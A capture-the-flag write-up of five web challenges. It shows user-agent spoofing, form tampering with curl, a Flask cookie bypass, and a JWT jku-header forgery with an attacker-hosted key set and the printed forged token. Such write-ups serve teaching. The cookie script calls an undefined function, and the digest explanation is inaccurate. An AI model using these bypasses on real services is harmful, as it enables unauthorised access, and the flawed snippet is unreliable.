# Web Challenges

## Agent 95
> They've given you a number, and taken away your name~

You don't look like our agent!
We will only give our flag to our Agent 95! He is still running an old version of Windows...

This looks easy enough, we just need to spoof our user agent as a Windows 95 user

```bash
curl -A "Mozilla/4.0 (compatible; MSIE 5.5; Windows 95; BCD2000)" http://jh2i.com:50000/
```

Flag : ```flag{user_agents_undercover}```

## Localghost
> 75 | BooOooOooOOoo! This spooOoOooky client-side cooOoOode sure is scary! What spoOoOoOoky secrets does he have in stooOoOoOore??

Endless scrolling of ghosts, funny enough, the flag is just as the question mentioned, stored in localstorage LOL

Flag: ```JCTF{spoooooky_ghosts_in_storage}```

## Phphonebook
> 100 Ring ring! Need to look up a number? This phonebook has got you covered! But you will only get a flag if it is an emergency!

![](files/phphonebook.png)

Seeing the source it looks like it sends a posts request with form data number to the same page, we try a few numbers but it does nothing

Lets try sending an emergency instead using curl

```bash
curl --location --request POST 'http://jh2i.com:50002/phphonebook.php' \
--header 'Host: localhost:3000' \
--header 'Connection: close' \
--form 'number=999' \
--form 'emergency=1'
```

and we have the flag, Remember *you will only get a flag if it is an emergency!* ? Haha

Flag: ```flag{phon3_numb3r_3xtr4ct3d}```

## Official Business
> 125
Are you here on official business? Prove it.

When we first visit the site we see 

![](files/offbus1.png)

We try some combinations of user password but we always get 403 Forbidden
After checking some typical urls, we stumble upon the robots.txt file which dumps the entire source code, looks like its a python flask app

Important part of the code as follows: 
```python
def do_login(user, password, admin):

    cookie = {"user": user, "password": password, "admin": admin}
    cookie["digest"] = hashlib.sha512(
        app.secret_key + bytes(json.dumps(cookie, sort_keys=True), "ascii")
    ).hexdigest()

    response = make_response(redirect("/"))
    response.set_cookie("auth", binascii.hexlify(json.dumps(cookie).encode("utf8")))

    return response


@app.route("/login", methods=["POST"])
def login():

    user = request.form.get("user", "")
    password = request.form.get("password", "")

    if (
        user != "hacker"
        or hashlib.sha512(bytes(password, "ascii")).digest()
        != b"hackshackshackshackshackshackshackshackshackshackshackshackshack"
    ):
        return abort(403)
    return do_login(user, password, True)
```

The login post handler checks if the user is `hacker` and password is `hackshackshackshackshackshackshackshackshackshackshackshackshack`, however, the digest will always churn out a string in hex and the if loop will always be true and return a 403. The else is supposed to call the `do_login` method
which basically sets an auth cookie to remember authenticated users.

We do not know `app.secret_key` but is this a problem?

```python
@app.route("/")
def index():

    ok, cookie = load_cookie()
    if not ok:
        return abort(403)

    return render_template(
        "index.html",
        user=cookie.get("user", None),
        admin=cookie.get("admin", None),
        flag=FLAG,
    )

```
The block loads the cookie and returns the flag if load_cookie() returns True for ok.

```python
def load_cookie():

    cookie = {}
    auth = request.cookies.get("auth")
    if auth:

        try:
            cookie = json.loads(binascii.unhexlify(auth).decode("utf8"))
            digest = cookie.pop("digest")

            if (
                digest
                != hashlib.sha512(
                    app.secret_key + bytes(json.dumps(cookie, sort_keys=True), "ascii")
                ).hexdigest()
            ):
                return False, {}
        except:
            pass

    return True, cookie

```
Sadly, the `load_cookie` function simply checks if theres a cookie named `auth`, the return False will not be performed if an exception occurs and it will return `True` which causes our flag to be given to us 

Flag: ```flag{did_this_even_pass_code_review}```



Our code to generate our cookie :
```python
# Cookie generator
import hashlib
import binascii
import json

def gen_cookie():

    cookie = {"user": "hacker", "password": 'hackshackshackshackshackshackshackshackshackshackshackshackshack', "admin": True}
    cookie["digest"] = hashlib.sha512(
        bytes(json.dumps(cookie, sort_keys=True), "ascii")
    ).hexdigest()

    return binascii.hexlify(json.dumps(cookie).encode("utf8"))

print (do_login())
```

## Flag Jokes
> 200
Want to hear a joke? Want the flag? How about both? Why don't YOU tell me a joke!

Get it? Flag Jokes? Flag Jwks?

Login as any user, we get a JWT signed using the JWKS from the CTF server.
There is a jwt attack where you can manipulate and sign tampered requests by replacing the jku header with your own malicious hosted jwks.

This is easy to do using [jwt_tool](https://github.com/ticarpi/jwt_tool/blob/master/jwt_tool.py)

Our hosted jwks : 
```json
{
    "keys": [
        {
            "e": "AQAB",
            "kid": "sqcE1a9gj9p08zNMR1MWbLLvuaPyUeJEsClBhy7Q4Jc",
            "kty": "RSA",
 	    "n":"g9jlwIpKcQtiIumDbrEsE2ifYBiCxgJ14bQRmmaMT3mJKuZX3Et9OVMcNGP7rGLSRgp32LvkYA6Mb_WGAwBVNNc2ZSI4oGuFRJWbHM9EvnoVe5kMk5Y5-CLSYjvYwlSt3VGlBmXdHCTTOH6gD6W-WmpB5uWYoHAwEFDav_SxdwXiM6v0-whoowNmqtwSDkGbjke6-kgnGF7U07cJPEhixjTR9Ta7He0VPfH2S2DX09LwLlNjKz0ru8l6O_tnzfvWoPJP4AaDsc9JDVLkHL3ilJ_-iIo-aDwhD7fbS7waIGnRXEizgBYV8k3T7aO3kw5Kf3sI3QWXC4kDKfvxkyJPYQ"
	}
    ]
}

```
Our tampered and self signed jwt token : 
```
eyJhbGciOiJSUzI1NiIsImtpZCI6InNxY0UxYTlnajlwMDh6Tk1SMU1XYkxMdnVhUHlVZUpFc0NsQmh5N1E0SmMiLCJqa3UiOiJodHRwczovL3F6LnNnL2p3a3MuanNvbiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.RiCNXouyCn7PLP64odTJ_fh3xosvrGdxX_weWGFzreCE3eNP2QNoO2tzVQ3MS1421EU4eFT5GkYfNY5SqhZ_FML1yhUAupKZEmbRfpTmafBqME6eTujdO7ksQdQJ9Hn2i6d7T8_5cPtv0lW8OO77Az_aRHhahR9VZ3JtyloDn5I4Xp-IxvqH6A2-labb9MDuKLX7DpVoZLM-wRAwN7SjaqX_j2VByFcpLzEjEIK9xxalqp3V6gUfD7J7u1lfGYOkmGlFu24RyBQHBwlsUtWXnmW-ddKlRs04QM7E31K1Y6qTRIOrnsWoyMvOkPWFAk79WLXuwsJDgd1KYwKACoVIYg
```

![](files/jwks.png)

Replace our `token` cookie with the jwt token we forged and refresh the page and we get the flag

Flag : ```flag{whoops_typo_shoulda_been_flag_jwks}```
